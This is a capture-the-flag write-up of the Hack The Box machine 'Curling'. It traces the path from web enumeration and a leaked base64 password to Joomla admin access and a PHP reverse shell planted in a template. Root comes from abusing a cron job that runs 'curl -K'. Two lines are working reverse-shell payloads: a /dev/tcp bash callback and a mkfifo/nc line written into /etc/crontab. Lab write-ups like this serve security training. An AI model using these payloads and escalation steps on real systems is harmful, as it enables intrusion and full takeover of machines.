![[curling_infocard.png]]


10.129.201.151

Nmap scan:
```sh
❯ sudo nmap -sC -sV -T4 -oA Scans/nmap/curling 10.129.201.151
Command executed at: 2025-03-23 12:59:06
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-23 12:59 PDT
Nmap scan report for 10.129.201.151
Host is up (0.077s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.68 seconds
```

Looks like there's a Joomla website on port 80.

![[curling_homepage.png]]

Found a comment at the end of the home page's source code that mentions secret.txt

```html
		</div>
	</footer>
	
</body>
      <!-- secret.txt -->
</html>
```

Navigating to /secret.txt, we find some sort of code: Q3VybGluZzIwMTgh

![[curling_secret.png]]

The code is base64 and converts to `Curling2018!`
```sh
❯ echo -n "Q3VybGluZzIwMTgh" | base64 -d
Command executed at: 2025-03-23 13:20:52
Curling2018!
```

The blog posts are written by "Super User" and one of them mentions an actual name: Floris

![[curling_florispost.png]]

Attempting login on the homepage's login form as Floris lets us edit posts, but nothing useful. 

Used ffuf to enumerate subdomains, and found another login page at /administrator

```sh
❯ ffuf -w ~/MyWordlists/subdirectory/big.txt -u http://10.129.201.151/FUZZ -r
Command executed at: 2025-03-23 13:08:20

...
administrator           [Status: 200, Size: 5116, Words: 240, Lines: 110, Duration: 179ms]
...
:: Progress: [20469/20469] :: Job [1/1] :: 522 req/sec :: Duration: [0:00:45] :: Errors: 0 ::
```

![[curling_adminpage.png]]

Logging in with `Floris:Curling2018!` gives us access to the admin dashboard.

There's an ability to upload files, but attempting to upload a php reverse shell are blocked.
Modifying the settings, we can disable the restrict uploads feature.
![[curling_mediaoptions.png]]

The reverse shell was still being blocked from upload.

Navigating to Templates, we see that the unused Protostar template uses php files, which we can modify and include our reverse shell code

![[curling_template.png]]

Previewing the template executes the code, giving us a reverse shell.

```sh
❯ nc -lvnp 4444
Command executed at: 2025-03-23 13:26:38
listening on [any] 4444 ...
connect to [10.10.14.89] from (UNKNOWN) [10.129.201.151] 38018
Linux curling 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 20:37:22 up 46 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1662): Inappropriate ioctl for device
bash: no job control in this shell
www-data@curling:/$ 
```

A configuration file in the web root reveals the password for floris: `mYsQ!P4ssw0rd$yea!`
```sh
www-data@curling:/home/floris$ cat /var/www/html/configuration.php 
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'Cewl Curling site!';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'floris';
        public $password = 'mYsQ!P4ssw0rd$yea!';
        public $db = 'Joombla';
        public $dbprefix = 'eslfu_';
        public $live_site = '';
        public $secret = 'VGQ09exHr8W2leID';
```

Logging in to mysql as floris, using the above password, we're able to find an encrypted password for floris
```sh
mysql> select * from eslfu_users;
| 836 | Super User | floris   | webmaster@localhost | $2y$10$4t3DQSg0DSlKcDEkf1qEcu6nUFEr/gytHfVENwSmZN1MXxE1Ssx.e |
```


There is a file on /home/floris called password_backup
```txt
❯ cat password_backup
Command executed at: 2025-03-23 13:58:53
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```

The magic number `425a 6839 → BZh9` suggests this is bz2-compressed data, but decompressing it with bzip2 is not enough to recover the password.
Using `binwalk -e ` we can see what type of file it was, revealing that itw as compressed multiple times in different formats.
It can be decompressed to reveal the password: `5d<wdCbdZu)|hChXll`

Using this password, we can login as Floris via SSH.

```sh
❯ xxd -r password_backup > backup
Command executed at: 2025-03-23 14:10:23
❯ bzip2 -d backup
Command executed at: 2025-03-23 14:10:45
bzip2: Can't guess original name for backup -- using backup.out
❯ binwalk -e backup.out
Command executed at: 2025-03-23 14:11:11

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             gzip compressed data, has original file name: "password", from Unix, last modified: 2018-05-22 19:16:20
24            0x18            bzip2 compressed data, block size = 900k

❯ mv backup.out backup.gz
Command executed at: 2025-03-23 14:11:20
❯ gzip -d backup.gz
Command executed at: 2025-03-23 14:11:25
❯ ls
Command executed at: 2025-03-23 14:11:41
backup  _backup.out.extracted  password_backup  php-reverse-shell.php  Scans
❯ binwalk _backup.out.extracted/password
Command executed at: 2025-03-23 14:12:05

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             bzip2 compressed data, block size = 900k

❯ bzip2 -d _backup.out.extracted/password
Command executed at: 2025-03-23 14:12:20
bzip2: Can't guess original name for _backup.out.extracted/password -- using _backup.out.extracted/password.out
❯ binwalk _backup.out.extracted/password.out
Command executed at: 2025-03-23 14:12:30

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             POSIX tar archive (GNU), owner user name: ".txt"

❯ tar xf _backup.out.extracted/password.out
Command executed at: 2025-03-23 14:12:43
❯ ls
Command executed at: 2025-03-23 14:12:44
backup  _backup.out.extracted  password_backup  password.txt  php-reverse-shell.php  Scans
❯ cat password.txt
Command executed at: 2025-03-23 14:12:49
5d<wdCbdZu)|hChXll
❯ ssh floris@10.129.201.151
Command executed at: 2025-03-23 14:12:55
floris@10.129.201.151's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Mar 23 21:12:55 UTC 2025

  System load:  0.01              Processes:            176
  Usage of /:   62.3% of 3.87GB   Users logged in:      0
  Memory usage: 22%               IP address for ens33: 10.129.201.151
  Swap usage:   0%


0 updates can be applied immediately.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Wed Sep  8 11:42:07 2021 from 10.10.14.15
floris@curling:~$ cat user.txt
281d2bc862797f1c4dbe827fe3cda065 
```


Floris' home folder contains an admin-area folder which has two files in it that are owned by root but writeable by floris. Possibly useful for priv esc.

```sh
floris@curling:~$ ls -la admin-area/
total 12
drwxr-x--- 2 root   floris 4096 Aug  2  2022 .
drwxr-xr-x 6 floris floris 4096 Aug  2  2022 ..
-rw-rw---- 1 root   floris   25 Mar 23 21:16 input
-rw-rw---- 1 root   floris    0 Mar 23 21:16 report
floris@curling:~$ cat admin-area/input
url = "http://127.0.0.1"
floris@curling:~$ cat admin-area/report
```

The dates of these files look as though they are modified frequently, so we should run PSpy to see what processes might use them.

```sh
floris@curling:/tmp$ ./pspy                                                                                                                                                                                                                 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d                                                                                                     Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)  
Draining file system events due to startup...         
...
2025/03/23 21:19:58 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
2025/03/23 21:20:01 CMD: UID=0     PID=3236   | sleep 1 
2025/03/23 21:20:01 CMD: UID=0     PID=3235   | /usr/sbin/CRON -f 
2025/03/23 21:20:01 CMD: UID=0     PID=3234   | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input 
2025/03/23 21:20:01 CMD: UID=0     PID=3233   | /usr/sbin/CRON -f 
2025/03/23 21:20:01 CMD: UID=0     PID=3232   | /usr/sbin/CRON -f 
2025/03/23 21:20:01 CMD: UID=0     PID=3237   | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
2025/03/23 21:20:02 CMD: UID=0     PID=3238   | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input 
2025/03/23 21:21:01 CMD: UID=0     PID=3243   | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
2025/03/23 21:21:01 CMD: UID=0     PID=3242   | 
2025/03/23 21:21:01 CMD: UID=0     PID=3241   | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
2025/03/23 21:21:01 CMD: UID=0     PID=3240   | /usr/sbin/CRON -f 
2025/03/23 21:21:01 CMD: UID=0     PID=3239   | /usr/sbin/CRON -f 
2025/03/23 21:21:01 CMD: UID=0     PID=3244   | sleep 1 
2025/03/23 21:21:02 CMD: UID=0     PID=3245   | cat /root/default.txt 
2025/03/23 21:22:01 CMD: UID=0     PID=3251   | sleep 1 
2025/03/23 21:22:01 CMD: UID=0     PID=3250   | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
2025/03/23 21:22:01 CMD: UID=0     PID=3249   | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input 
2025/03/23 21:22:01 CMD: UID=0     PID=3248   | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
2025/03/23 21:22:01 CMD: UID=0     PID=3247   | /usr/sbin/CRON -f 
2025/03/23 21:22:01 CMD: UID=0     PID=3246   | /usr/sbin/CRON -f 
2025/03/23 21:22:02 CMD: UID=0     PID=3253   | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input
...
```

It looks like root is using the `input` file as the config `-K` for `curl` and outputting the result to `report`. 
Since Floris can write to `input` we can modify it to achieve privilege escalation.

Modifying the input file to connect to our listener only gave us a shell as www-data. This is because 127.0.0.1 points to a local web service running as `www-data`.
```sh
floris@curling:~/admin-area$ cat input
url = "http://127.0.0.1"
output = "|/bin/bash -i >& /dev/tcp/10.10.14.89/4444 0>&1"
```
The `|` in the output tells curl to execute the following as a command.

```sh
❯ nc -lvnp 4444
Command executed at: 2025-03-23 14:30:18
listening on [any] 4444 ...
connect to [10.10.14.89] from (UNKNOWN) [10.129.201.151] 38890
Linux curling 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 21:31:01 up  1:40,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
floris   pts/1    10.10.14.89      21:12   36.00s  0.10s  0.10s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1662): Inappropriate ioctl for device
bash: no job control in this shell
www-data@curling:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Instead, we can modify the config to write to a root-owned file, and escalate that way.

Since this cron is running every minute, we can replace it with one that connects back to us every minute.
We add this line at the bottom:
```sh
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.89 4444 >/tmp/f
```
Now we can modify the input file to download our crontab and output it to /etc/crontab

```sh
url = "http://10.10.14.89/crontab"
output = "/etc/crontab"
```

When the cron runs it will download our crontab and save it over /etc/crontab, causing our code to run every minute, connecting back to our listener.

```sh
❯ python3 -m http.server 80
Command executed at: 2025-03-23 14:43:21
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.201.151 - - [23/Mar/2025 14:44:03] "GET /crontab HTTP/1.1" 200 -
```


```sh
floris@curling:~/admin-area$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.89 4444 >/tmp/f
```


```sh
❯ nc -lvnp 4444
Command executed at: 2025-03-23 14:42:52
listening on [any] 4444 ...
connect to [10.10.14.89] from (UNKNOWN) [10.129.201.151] 39112
/bin/sh: 0: cant access tty; job control turned off
> id
uid=0(root) gid=0(root) groups=0(root)
> cat /root/root.txt
692f2756895c539d86769f33e2223a51
```


![[curling_completed.png]]


https://app.hackthebox.com/machines/160

